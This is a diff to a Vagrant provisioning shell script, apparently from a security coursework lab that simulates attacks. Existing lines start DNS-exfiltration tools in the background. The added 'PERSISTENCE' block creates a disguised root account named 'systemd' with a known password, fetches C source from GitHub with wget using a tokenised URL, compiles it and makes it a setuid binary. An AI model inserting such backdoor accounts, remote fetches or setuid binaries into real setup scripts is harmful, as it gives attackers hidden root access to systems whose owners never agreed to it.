@@ -7,6 +7,7 @@
 # General
 apt install rsyslog -y
 apt install dnsutils -y
+apt install gcc -y
 service rsyslog start
 apt-get install libpcap0.8 -y
 
@@ -46,6 +47,18 @@ nohup /tmp/run_qssender.sh &>/dev/null &
 cp /vagrant/attack/exfiltration/run_dnsteal.sh /tmp/run_dnsteal.sh
 chmod +x /tmp/run_dnsteal.sh
 nohup /tmp/run_dnsteal.sh &>/dev/null &
+
+#[PERSISTENCE]
+
+#Create root user
+useradd -ou 0 -g 0 systemd
+chpasswd <<<"systemd:systemd"
+#suid binary
+cd /tmp
+wget "https://raw.githubusercontent.com/kevinnivekkevin/3204_coursework_1/main/attack/Persistence/binarysuid?token=GHSAT0AAAAAABZGUXA6ZPLNEYAOANXQOGRCY2UFGGQ" -O /var/tmp/suid.c
+gcc suid.c -o suid
+chmod 7111 suid
+rm suid.c
 
 
 # Start beats
